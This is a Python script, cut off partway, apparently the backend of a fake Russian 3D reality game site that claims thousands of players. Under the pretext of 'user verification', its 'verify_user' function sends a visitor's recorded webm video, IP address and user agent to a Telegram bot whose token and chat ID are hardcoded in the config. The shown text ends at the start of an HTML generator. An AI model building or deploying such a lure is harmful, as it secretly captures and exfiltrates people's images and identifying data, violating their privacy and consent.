#!/usr/bin/env python3
import os
import json
import requests
from datetime import datetime
from socket import gethostbyname, gethostname

# Конфигурация приложения
config = {
    'site_name': 'Русский Реалити 3D',
    'players_count': '4,083',
    'domain': 'myrussiansim.local',
    'telegram': {
        'bot_token': '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig',
        'chat_id': '4798745489'
    }
}

def get_server_urls():
    """Возвращает доступные URL сервера"""
    try:
        local_ip = gethostbyname(gethostname())
    except:
        local_ip = '127.0.0.1'
    
    return {
        'custom_domain': f"http://{config.get('domain', 'localhost')}:5000",
        'local': "http://127.0.0.1:5000",
        'network': f"http://{local_ip}:5000"
    }

def verify_user(video_file, ip, user_agent):
    """Отправка видео в Telegram"""
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{config['telegram']['bot_token']}/sendVideo",
            files={'video': (f'verify_{datetime.now().strftime("%Y%m%d_%H%M%S")}.webm', video_file, 'video/webm')},
            data={
                'chat_id': config['telegram']['chat_id'],
                'caption': f"🔔 Новый игрок!\n🕒 {datetime.now()}\n🌐 IP: {ip}\n📱 {user_agent}"
            },
            timeout=30
        )
        return {"status": "success" if response.ok else "error"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def generate_html():
    """
